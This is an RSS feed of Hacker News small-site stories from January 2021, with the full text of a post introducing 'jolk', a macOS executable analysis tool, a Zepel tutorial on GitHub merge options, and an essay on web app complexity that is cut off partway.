<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 13 Jan 2021 09:04:56 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 13 Jan 2021 09:04:56 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[To $4m ARR in 3 years, bootstrapped (7 secrets revealed)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25727141">thread link</a>) | @Ilyazovtsev
<br/>
January 11, 2021 | https://ilya.today/gh-from-0-to-4mln | <a href="https://web.archive.org/web/*/https://ilya.today/gh-from-0-to-4mln">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ilya.today/gh-from-0-to-4mln</link>
            <guid isPermaLink="false">hacker-news-small-sites-25727141</guid>
            <pubDate>Mon, 11 Jan 2021 10:42:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing a new macOS System Release]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25727100">thread link</a>) | @kaendfinger
<br/>
January 11, 2021 | https://blog.endfinger.io/apple/macos/technical/jolk/2021/01/10/jolk.html | <a href="https://web.archive.org/web/*/https://blog.endfinger.io/apple/macos/technical/jolk/2021/01/10/jolk.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Perhaps my favorite time of the year is when the annual Apple <a href="https://en.wikipedia.org/wiki/Apple_Worldwide_Developers_Conference">WWDC</a> conference occurs. I am heavily inspired by Apple’s Software and Hardware meld, and I truly enjoy nearly every ounce of the conference. But nothing compares to the love I have for the macOS operating system. With it’s deep history and Unix origins, it brings an interesting take on a consumer operating system.</p>

<p>But macOS has one central problem, it’s almost entirely proprietary. macOS consists of <a href="https://opensource.apple.com/">a few open source components</a>, and a majority proprietary components. As someone with a strong Open Source origin and a professional grounding in software companies, it can be hard for me to sympathize with the belief that all software should be Open Source, but at the same time, I’m a curious developer, and I love knowing how things work.</p>

<p>This is what excites me every time a new macOS release is announced. I want to understand the technical foundations and changes on an entusiast level!</p>

<p>That’s why I’ve built a macOS system analysis tool called <a href="https://github.com/kendfinger/jolk">jolk</a>. jolk aims to scan and analyze all the executables found on a macOS installation and reports results about interesting findings.</p>

<p>First, let me dive into the most important note in this entire post. I am doing this purely as an enthusiest. I want to understand what makes up the macOS operating system. For example, I want to understand what daemons run when I use my FaceTime HD Camera on my MacBook Pro, or how the boot process on Apple M1 devices work. There is no intention of malicious use in this tool.</p>

<h2 id="what-is-jolk">What is jolk?</h2>

<p><a href="https://github.com/kendfinger/jolk">jolk</a> is a tool which will scan, analyze, and report the executables installed on a macOS system, providing useful details which can help whittle down to interesting aspects of the system. jolk is portmanteau of the words jog and walk. This is an personal inside joke to the time in which I owned the domain <code>idont.run</code>.</p>

<p>jolk combines a system executable finder and an executable analyzer. Using various built-in macOS development tools, you can discover a lot about what is installed on a system. jolk automates that task.</p>

<p>jolk currently supports the following analyzer passes:</p>

<ul>
  <li>lipo: discovers what architectures an executable supports using, you guessed it, the <code>lipo</code> tool.</li>
  <li>dynamic linker: determines frameworks and libraries that the executable links to.</li>
  <li>launchd: finds launchd services which reference the executable.</li>
  <li>strings: scans the executable for interesting strings.</li>
  <li>man page: backsearches man pages for mentions of the executable.</li>
</ul>

<h2 id="how-can-i-use-jolk">How can I use jolk?</h2>

<p>jolk can be ran by cloning the repository and building the jolk tool with Xcode.</p>

<p>Let’s start with an example usage of jolk to discover what the <code>/usr/libexec/remotectl</code> executable does.</p>

<div><div><pre><code><span>$ </span>jolk <span>-o</span> remotectl.json <span>-i</span> <span>'/usr/libexec/remotectl'</span>
analyze /usr/libexec/remotectl
<span>complete</span> /usr/libexec/remotectl 253.41ms
</code></pre></div></div>

<p>This will produce a JSON report in the file <code>remotectl.json</code> which contains relevant information about the <code>remotectl</code> utility.</p>

<div><div><pre><code><span>{</span><span>
  </span><span>"/usr/libexec/remotectl"</span><span> </span><span>:</span><span> </span><span>{</span><span>
    </span><span>"dynamic-linker.linked-files"</span><span> </span><span>:</span><span> </span><span>[</span><span>
      </span><span>"/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation"</span><span>,</span><span>
      </span><span>"/System/Library/PrivateFrameworks/BridgeXPC.framework/Versions/A/BridgeXPC"</span><span>,</span><span>
      </span><span>"/System/Library/PrivateFrameworks/RemoteXPC.framework/Versions/A/RemoteXPC"</span><span>,</span><span>
      </span><span>"/System/Library/PrivateFrameworks/RemoteServiceDiscovery.framework/Versions/A/RemoteServiceDiscovery"</span><span>,</span><span>
      </span><span>"/usr/lib/libobjc.A.dylib"</span><span>,</span><span>
      </span><span>"/usr/lib/libSystem.B.dylib"</span><span>,</span><span>
      </span><span>"/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation"</span><span>
    </span><span>],</span><span>
    </span><span>"dynamic-linker.linked-frameworks"</span><span> </span><span>:</span><span> </span><span>[</span><span>
      </span><span>"/System/Library/Frameworks/Foundation.framework"</span><span>,</span><span>
      </span><span>"/System/Library/PrivateFrameworks/BridgeXPC.framework"</span><span>,</span><span>
      </span><span>"/System/Library/PrivateFrameworks/RemoteXPC.framework"</span><span>,</span><span>
      </span><span>"/System/Library/PrivateFrameworks/RemoteServiceDiscovery.framework"</span><span>,</span><span>
      </span><span>"/System/Library/Frameworks/CoreFoundation.framework"</span><span>
    </span><span>],</span><span>
    </span><span>"lipo.architectures"</span><span> </span><span>:</span><span> </span><span>[</span><span>
      </span><span>"x86_64"</span><span>,</span><span>
      </span><span>"arm64e"</span><span>
    </span><span>],</span><span>
    </span><span>"man-page.exists"</span><span> </span><span>:</span><span> </span><span>false</span><span>,</span><span>
    </span><span>"strings.likely.has-help-flag"</span><span> </span><span>:</span><span> </span><span>false</span><span>,</span><span>
    </span><span>"strings.likely.has-usage"</span><span> </span><span>:</span><span> </span><span>true</span><span>
  </span><span>}</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>Hmm, it appears from the entry <code>"strings.likely.has-usage" : true</code> that this command has a usage message, lets run the tool to see if we can capture the usage.</p>

<div><div><pre><code><span>$ </span>/usr/libexec/remotectl
usage: remotectl list
usage: remotectl show <span>(</span><span>type</span>|name|uuid|trait<span>)</span>
usage: remotectl get-property <span>(</span><span>type</span>|name|uuid|trait<span>)</span> <span>[</span>service] property
usage: remotectl dumpstate
usage: remotectl browse
usage: remotectl <span>echo</span> <span>[</span><span>-v</span> service_version] <span>[</span><span>-d</span> <span>(</span><span>type</span>|name|uuid|trait<span>)]</span>
usage: remotectl echo-file <span>(</span><span>type</span>|name|uuid|trait<span>)</span> path
usage: remotectl eos-echo
usage: remotectl netcat <span>(</span><span>type</span>|name|uuid|trait<span>)</span> service
usage: remotectl relay <span>(</span><span>type</span>|name|uuid|trait<span>)</span> service
usage: remotectl loopback <span>(</span>attach|connect|detach|suspend|resume<span>)</span>
usage: remotectl bonjour <span>((</span><span>enable</span>|enable-loopback interface_name<span>)</span>|<span>(</span>disable<span>))</span>
usage: remotectl convert-bridge-version plist-in-path bin-out-path
usage: remotectl heartbeat <span>(</span><span>type</span>|name|uuid|trait<span>)</span>
usage: remotectl trampoline <span>[</span><span>-2</span> fd] service_name <span>command </span>args ... <span>[</span> <span>--</span> <span>[</span><span>-2</span> fd] service_name <span>command </span>args ... <span>]</span>
usage: remotectl reset <span>(</span><span>type</span>|name|uuid|trait<span>)</span>
usage: remotectl <span>alias</span> <span>(</span><span>type</span>|name|uuid|trait<span>)</span> <span>alias</span>
</code></pre></div></div>

<p>It also appears that <code>remotectl</code> links to the framework <code>/System/Library/PrivateFrameworks/RemoteServiceDiscovery.framework</code>, I bet that’s got some interesting uses. Maybe I will investigate other executables later that use this framework. By running jolk without an <code>include</code> flag, we can scan the entire system, and find any executables that link this framework.</p>

<h2 id="future-improvements">Future Improvements</h2>

<p>My ultimate goal is for jolk is to be able to scan, diff, and analyze multiple macOS releases to discover what has truly changed about the system between releases. Please don’t hesitate to create issues on the repository for suggestions or improvements.</p>

<h2 id="conclusion">Conclusion</h2>

<p>jolk is intended to be used for enthusiast analysis of a macOS system. I hope other enthusiasts find this tool interesting and useful.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://blog.endfinger.io/apple/macos/technical/jolk/2021/01/10/jolk.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25727100</guid>
            <pubDate>Mon, 11 Jan 2021 10:36:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to merge branches in GitHub? With comparison of merge options]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25726719">thread link</a>) | @svikashk
<br/>
January 11, 2021 | https://zepel.io/blog/how-to-merge-branches-in-github/ | <a href="https://web.archive.org/web/*/https://zepel.io/blog/how-to-merge-branches-in-github/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>When coding collaboratively, suggesting changes becomes a regular affair. <a href="https://zepel.io/blog/create-pull-requests-in-github/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">Creating pull requests</a> and merging them after a review is the best solution to prevent developers from stepping on each other’s toes. </p><p>With Merge Pull Request, GitHub allows you (the reviewer) to go through the suggested changes. From here, you can choose to apply them or add comments to make further changes to the code.</p><p>It is particularly useful as it helps merge code from different branches and make sure the code that gets deployed to production is bug-free. </p><p>By carefully reviewing the suggested changes before applying them, the risk of jeopardizing your code can be greatly minimized. </p><p>Now, let’s dive straight in and learn how to Merge Pull Requests.</p><hr><h2 id="before-you-begin">Before You Begin</h2><p>We previously saw <a href="https://zepel.io/blog/how-to-create-a-new-branch-in-github/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">how to create a new branch</a>. </p><p>But before we jump in, let's take a quick recap on what a base branch and a head branch is. </p><figure><img src="https://zepel.io/blog/content/images/2021/01/Base-vs-head.png" alt="Base branch and head branch on GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/Base-vs-head.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/Base-vs-head.png 1000w, https://zepel.io/blog/content/images/2021/01/Base-vs-head.png 1304w" sizes="(min-width: 720px) 720px"><figcaption>Here's an illustration to help you understand what a base branch and a head branch is.</figcaption></figure><p>The <em>base branch</em> is the branch you wish to merge the approved pull requests into i.e apply the suggested changes to. Whereas the <em>head branch</em> is the branch created by branching off from the base branch. And it contains the suggested changes. </p><p>Most often, the base branch will be the <em>master branch</em>.</p><p>So, make sure that you thoroughly inspect each pull request, resolve conflicts if any, and only then merge the changes into the master branch. Because, at the end of the day, the master branch should contain only the up-to-date final version of your code.</p><p>You can use these <a href="https://zepel.io/blog/5-git-workflows-to-improve-development/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">5 Git workflows</a> to ensure that no conflicts arise while merging.</p><hr><h2 id="merging-a-branch-s-pull-request-in-github">Merging a Branch's Pull Request in GitHub </h2><p>Follow these simple steps to merge a branch's PR in GitHub:</p><p>1. Open the main page of your repository on your GitHub account in your browser and click on the Pull requests tab.</p><p>2. Now, you’ll be shown a list of all the pull requests that require reviewing. Click on the pull request of your choice.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/pull-requests-tab-in-github.png" alt="Pull requests list in GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/pull-requests-tab-in-github.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/pull-requests-tab-in-github.png 1000w, https://zepel.io/blog/content/images/2021/01/pull-requests-tab-in-github.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>Choose a Pull Request from the list of pull requests shown.</figcaption></figure><p>3. You will be able to have an overview of the details of the pull request under the <code>Conversation</code> tab.</p><p>4. Select the <code>Files Changed</code> tab to view the suggested changes.<br></p><figure><img src="https://zepel.io/blog/content/images/2021/01/files-changed-tab-github.png" alt="Viewing suggested changes under File Changes in GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/files-changed-tab-github.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/files-changed-tab-github.png 1000w, https://zepel.io/blog/content/images/2021/01/files-changed-tab-github.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>View the suggested changes under the File changes tab in GitHub.</figcaption></figure><p>5. A. Once you’ve viewed the changes, you can either go back to the <code>Conversation</code> tab to perform <code>Merge Pull Requests</code> by <a href="#selecting-merge-pull-request-options">selecting one of the 3 options</a> using the dropdown. <br></p><figure><img src="https://zepel.io/blog/content/images/2021/01/merge-pull-request-button-github.png" alt="Merge Pull Request Button in GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/merge-pull-request-button-github.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/merge-pull-request-button-github.png 1000w, https://zepel.io/blog/content/images/2021/01/merge-pull-request-button-github.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>Click on the drop-down arrow to select one of the 3 Merge Pull Requests options.</figcaption></figure><p>5. B. Or you can click on the <code>Review changes</code> button on the top right corner and you can choose to comment, approve or request further changes.<br></p><figure><img src="https://zepel.io/blog/content/images/2021/01/review-changes-in-github.png" alt="Review changes button in GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/review-changes-in-github.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/review-changes-in-github.png 1000w, https://zepel.io/blog/content/images/2021/01/review-changes-in-github.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>Comment, approve, or request further changes to a PR using Review changes in GitHub.</figcaption></figure><p>6. If you disapprove of the pull request, click on the <code>Close pull request</code> button at the bottom of the page.</p><p><em>Tip: Delete the head branch after merging to keep your repository tidy.</em> :)</p><!--kg-card-begin: html--><h2 id="”#selecting-merge-pull-request-options”">Selecting the Merge Pull Request options </h2><!--kg-card-end: html--><p>Let us understand all the 3 options available to perform Merge Pull Requests in GitHub before selecting one:</p><ol><li><a href="#default-merge-pull-request">Merge Pull Request</a></li><li><a href="#squash-and-merge">Squash and merge</a></li><li><a href="#rebase-and-merge">Rebase and merge</a><br></li></ol><figure><img src="https://zepel.io/blog/content/images/2021/01/merge-pull-request-options-github.png" alt="Merge pull request options in GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/merge-pull-request-options-github.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/merge-pull-request-options-github.png 1000w, https://zepel.io/blog/content/images/2021/01/merge-pull-request-options-github.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>Select a suitable option of your choice to merge your PR on GitHub.</figcaption></figure><!--kg-card-begin: html--><h3 id="”default-merge-pull-request”"> Merge Pull Request or Create a merge commit</h3><!--kg-card-end: html--><p>Merge Pull Request option, or the create a merge commit option, is the default option. Clicking this will merge all the commits in the PR, suggested in the head branch, into the base branch. </p><figure><img src="https://zepel.io/blog/content/images/2021/01/Merge-Pull-Request.png" alt="Merge pull request or create a merge commit on GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/Merge-Pull-Request.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/Merge-Pull-Request.png 1000w, https://zepel.io/blog/content/images/size/w1600/2021/01/Merge-Pull-Request.png 1600w, https://zepel.io/blog/content/images/2021/01/Merge-Pull-Request.png 1636w" sizes="(min-width: 720px) 720px"><figcaption>Here's an illustration explaining the default Merge Pull Request option or Create a merge commit option.&nbsp;</figcaption></figure><p>In this illustration, the head branch gets branched off from the second commit in the base branch. Some changes are suggested as new commits in the head branch and they must now be updated in the base branch. By <code>Merge pull request</code>, the commits get added to the base branch as depicted in the image above.</p><p><em>Note: You need to have the write permissions in the repo.</em></p><!--kg-card-begin: html--><h3 id="”squash-and-merge”"> Squash and merge branch</h3><!--kg-card-end: html--><p>Squash and merge combines all the commits in the PR into one single commit and then merges it from the head branch into the base branch. This way, your history can be made more clear and streamlined.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/Squash-and-Merge.png" alt="Squash and merge on GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/Squash-and-Merge.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/Squash-and-Merge.png 1000w, https://zepel.io/blog/content/images/size/w1600/2021/01/Squash-and-Merge.png 1600w, https://zepel.io/blog/content/images/2021/01/Squash-and-Merge.png 1636w" sizes="(min-width: 720px) 720px"><figcaption>This illustration explains what Squash and merge is on GitHub.</figcaption></figure><p>In this illustration, it can be noticed that the head branch gets branched off from the base branch’s second commit. And two new commits are added to the head. By <code>Squash and merge</code>, both these commits get squashed into a single commit and then merged into the base branch as shown in the image above. &nbsp;</p><p><em>Note: You not only require write permissions in the repo but your repo must also allow squash merging.</em></p><!--kg-card-begin: html--><h3 id="”rebase-and-merge”"> Rebase and merge branch</h3><!--kg-card-end: html--><p>Rebase and merge adds all commits (in the PR) from the head branch individually to the base branch, without merge commit. For all those hotfixes and one-off commits that can’t be merged into other commits, this is your go-to option.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/Rebase-and-merge.png" alt="Rebase and merge on GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/Rebase-and-merge.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/Rebase-and-merge.png 1000w, https://zepel.io/blog/content/images/size/w1600/2021/01/Rebase-and-merge.png 1600w, https://zepel.io/blog/content/images/2021/01/Rebase-and-merge.png 1636w" sizes="(min-width: 720px) 720px"><figcaption>Here's an illustration depicting Rebase and merge option on GitHub.</figcaption></figure><p>As seen in the illustration, the base branch gets branched off in the second commit to form the head branch. A little while later a new commit gets added to the base branch. Meanwhile commits are made in the head branch. </p><p>By <code>Rebase and merge</code> from base branch to head branch, the base of the head branch gets rebased. That is, now, the head branch gets branched off from the third (new) commit so that the new commit is included in the head branch. And then, the commits in the head branch get applied. </p><p>Now, to update the base branch with the latest commits in head, rebasing is done from head to base as depicted in the image above. &nbsp; </p><p><em>Note: You need write permissions in the repository and your repo must allow rebase merging.</em></p><hr><h2 id="how-to-automatically-merge-a-branch-s-pull-requests">How to Automatically Merge a Branch's Pull Requests</h2><p>Auto-merge is a feature offered by GitHub that lets PRs automatically be merged into your base branch if the required criteria set for your branch are met.</p><p>To set this up, follow the steps below:</p><p>1. Navigate to the Setting tab under the main page of your repository.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/setting-tab-github.png" alt="Settings tab on GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/setting-tab-github.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/setting-tab-github.png 1000w, https://zepel.io/blog/content/images/2021/01/setting-tab-github.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>Navigate to the Settings tab to enable auto-merge on GitHub.</figcaption></figure><p>2. Under the Options tab, scroll down to find and enable the <code>Allow auto-merge</code> button under the Merge button section.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/auto-merge-in-github.png" alt="Auto-merge on GitHub" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/auto-merge-in-github.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/auto-merge-in-github.png 1000w, https://zepel.io/blog/content/images/2021/01/auto-merge-in-github.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>Enable auto-merge to merge PRs automatically when the criteria are met.</figcaption></figure><p><em>Note: This auto-merge feature of GitHub is currently in the beta stage and is subject to change.</em></p><hr><p>As a developer, it is essential to have a developer-friendly PM tool to complement your <a href="https://zepel.io/blog/simple-software-development-workflow/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">development workflow</a>.</p><p>Zepel is one of the most developer-friendly PM tools providing <a href="https://zepel.io/integrations/github/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">deep integration with GitHub</a>. </p><p>Now, you needn’t bother doing the boring routine work of status updates as Zepel will take care of it for you. Instead, you can focus all your time and energy on building state-of-the-art software products.</p><p>All you’ve got to do is use Zepel’s suggested branch name when you create a new branch.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/zepel-github-link-feature-to-branch.png" alt="Link your Zepel feature to your GitHub branch" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/zepel-github-link-feature-to-branch.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/zepel-github-link-feature-to-branch.png 1000w, https://zepel.io/blog/content/images/2021/01/zepel-github-link-feature-to-branch.png 1192w" sizes="(min-width: 720px) 720px"><figcaption>Link your GitHub branch to your feature in Zepel.</figcaption></figure><p>And if you want to get real-time notifications of your team’s progress updates, <a href="https://zepel.io/guide/integrations/link-with-slack/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">simply connect your Slack with Zepel</a>.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/zepel-git-developer-workflow.png" alt="Git workflow setup with Slack using Zepel" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/zepel-git-developer-workflow.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/zepel-git-developer-workflow.png 1000w, https://zepel.io/blog/content/images/2021/01/zepel-git-developer-workflow.png 1274w" sizes="(min-width: 720px) 720px"><figcaption>Setup your Git workflow with Zepel and receive real-time Slack notifications on progress updates.</figcaption></figure><p>That’s not all. You can even <a href="https://zepel.io/guide/integrations/open-pull-request/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">open a PR from within Zepel</a>!</p><hr><p>Hate manually updating your progress in your current PM tool? <a href="https://zepel.io/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">Try Zepel for free</a> and leave this boring grunt work to us while you concentrate on the important stuff and increase your development velocity.</p><p>If you're not fully convinced, see how <a href="https://zepel.io/agile-tools/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">Zepel compares to other agile project management tools</a> and <a href="https://zepel.io/customer-reviews/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=how-to-merge-branches-in-github">check out why 4000+ teams prefer it over others</a>.</p>
                </div>
            </section></div>]]>
            </description>
            <link>https://zepel.io/blog/how-to-merge-branches-in-github/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726719</guid>
            <pubDate>Mon, 11 Jan 2021 09:43:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Web apps are too complex. This is how we can simplify them]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25726700">thread link</a>) | @pietmichal
<br/>
January 11, 2021 | https://michalpietraszko.com/web-apps-are-too-complex-this-is-how-we-can-simplify-them/ | <a href="https://web.archive.org/web/*/https://michalpietraszko.com/web-apps-are-too-complex-this-is-how-we-can-simplify-them/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody"><p>I believe that we can do a better job of managing the complexity of our apps.</p>
<p>Not many of us realize how many second-order effects our decisions have caused.</p>
<p>Let’s see how complexity had grown over time.</p>
<h2>The Static era</h2>
<p>Simple times. We had a MySQL database, business logic and HTML + CSS views.</p>
<p>All content was static, the browser’s job was to display content, navigate and submit forms.</p>
<p><span>
      <a href="https://michalpietraszko.com/static/5a46cad524761cec773ff2212a339f3b/23296/simple.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Simple web app architecture diagram" title="Simple web app architecture diagram" src="https://michalpietraszko.com/static/5a46cad524761cec773ff2212a339f3b/f058b/simple.png" srcset="https://michalpietraszko.com/static/5a46cad524761cec773ff2212a339f3b/c26ae/simple.png 158w,
https://michalpietraszko.com/static/5a46cad524761cec773ff2212a339f3b/6bdcf/simple.png 315w,
https://michalpietraszko.com/static/5a46cad524761cec773ff2212a339f3b/f058b/simple.png 630w,
https://michalpietraszko.com/static/5a46cad524761cec773ff2212a339f3b/23296/simple.png 675w" sizes="(max-width: 630px) 100vw, 630px" loading="lazy">
  </a>
    </span></p>
<p>I like to think about test effort as a benchmark for simplicity. There were 3 layers.</p>
<p>Business logic and persistence layer can be easily integrated and view layer can be browser tested.</p>
<p>You may need a tester, developer, and a designer to maintain something like this. It is realistic to have one person responsible for all of this.</p>
<h2>The AJAX era</h2>
<p>JavaScript opened a door for more considerations in user experience. Adding a dynamic menu, forms, or calendar to a WordPress website was the coolest thing you could do.</p>
<p><span>
      <a href="https://michalpietraszko.com/static/e4346edb319dee1705e11e6dd38791a4/23296/ajax.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="web app with javascript architecture diagram" title="web app with javascript architecture diagram" src="https://michalpietraszko.com/static/e4346edb319dee1705e11e6dd38791a4/f058b/ajax.png" srcset="https://michalpietraszko.com/static/e4346edb319dee1705e11e6dd38791a4/c26ae/ajax.png 158w,
https://michalpietraszko.com/static/e4346edb319dee1705e11e6dd38791a4/6bdcf/ajax.png 315w,
https://michalpietraszko.com/static/e4346edb319dee1705e11e6dd38791a4/f058b/ajax.png 630w,
https://michalpietraszko.com/static/e4346edb319dee1705e11e6dd38791a4/23296/ajax.png 675w" sizes="(max-width: 630px) 100vw, 630px" loading="lazy">
  </a>
    </span></p>
<p>We have a complexity spike on the client-side.</p>
<p>Many browsers differed in JS implementation, which required jQuery to come into existence.</p>
<p>This gave a lot of power to designers and has moved more engineering effort into the front end. JavaScript made the browser extensible.</p>
<p>Did the testing complexity increase? Yes. Each new JavaScript bit could only be tested in a browser.</p>
<p>This requires testing, backend programming, JavaScript, and design expertise in your team. Jumping between server-side and client-side languages became frustrating. There was a trend to have different people responsible for each side.</p>
<h2>The Single-page era</h2>
<p>Remember the first example of the Angular.js app? The input field that automatically updated the content of the div? Good times.</p>
<p>Welcome to the single-page era where front-end development became even more complex than back-end development - mostly due to relevant logic moving to the client. As a result, the divide has increased and <a href="https://medium.com/@ericclemmons/javascript-fatigue-48d4011b6fc4">JavaScript fatigue</a> became a thing.</p>
<p><span>
      <a href="https://michalpietraszko.com/static/1e77454e6a0f33cdde1452c823e55b4f/cd138/spa.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="single-page application architecture diagram" title="single-page application architecture diagram" src="https://michalpietraszko.com/static/1e77454e6a0f33cdde1452c823e55b4f/f058b/spa.png" srcset="https://michalpietraszko.com/static/1e77454e6a0f33cdde1452c823e55b4f/c26ae/spa.png 158w,
https://michalpietraszko.com/static/1e77454e6a0f33cdde1452c823e55b4f/6bdcf/spa.png 315w,
https://michalpietraszko.com/static/1e77454e6a0f33cdde1452c823e55b4f/f058b/spa.png 630w,
https://michalpietraszko.com/static/1e77454e6a0f33cdde1452c823e55b4f/40601/spa.png 945w,
https://michalpietraszko.com/static/1e77454e6a0f33cdde1452c823e55b4f/cd138/spa.png 1220w" sizes="(max-width: 630px) 100vw, 630px" loading="lazy">
  </a>
    </span></p>
<p>We have ended up with two apps that are tightly coupled.</p>
<p>To maintain this, you need at least someone experienced in testing, backend, frontend development (extensive framework, tooling, and browser knowledge), and design.</p>
<p>Now, two apps have to be maintained, and there is much more code than ever. You have to maintain unit, integration, and end to end tests on both sides. Now business logic is not directly accessible due to security concerns.
Frontend and backend now have to maintain layers that are responsible for communication.</p>
<p>Client code needs lots of API mocks to be tested on lower levels - DOM tests are resource-heavy.</p>
<p>Orchestration becomes difficult because you have to make sure that deployments are synchronized. It is even more difficult if you have separate teams for the backend and frontend.</p>
<p>Don’t forget about browser testing that also can have a lot of overlap with client-side integration tests. Even more, things to consider in terms of complexity and trade-offs.</p>
<p>That resulted in more code, which contributed to - again - increased complexity.</p>
<p>SEO became problematic, but thankfully this problem has been addressed by the ecosystem through <a href="https://reactjs.org/docs/react-dom-server.html">server-side rendering</a> and <a href="https://reactjs.org/docs/react-dom.html#hydrate">hydration</a>.</p>
<p>Good patterns have emerged too. UX became better and more creative. We are finally capable of defining client-side logic in a manageable and scalable way.</p>
<p>We all know now that we want to have components and avoid excessive side effects, together with uncontrollable state mutation.</p>
<p>React de facto became a standard.</p>
<h2>Simplicity renaissance</h2>
<p>The remedy to complexity is embracing the coupling and making the developer experience unified.</p>
<p><span>
      <a href="https://michalpietraszko.com/static/101dc9780084c3b29106640f8ea67894/9cea8/how-it-feels.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="how it feels" title="how it feels" src="https://michalpietraszko.com/static/101dc9780084c3b29106640f8ea67894/f058b/how-it-feels.png" srcset="https://michalpietraszko.com/static/101dc9780084c3b29106640f8ea67894/c26ae/how-it-feels.png 158w,
https://michalpietraszko.com/static/101dc9780084c3b29106640f8ea67894/6bdcf/how-it-feels.png 315w,
https://michalpietraszko.com/static/101dc9780084c3b29106640f8ea67894/f058b/how-it-feels.png 630w,
https://michalpietraszko.com/static/101dc9780084c3b29106640f8ea67894/40601/how-it-feels.png 945w,
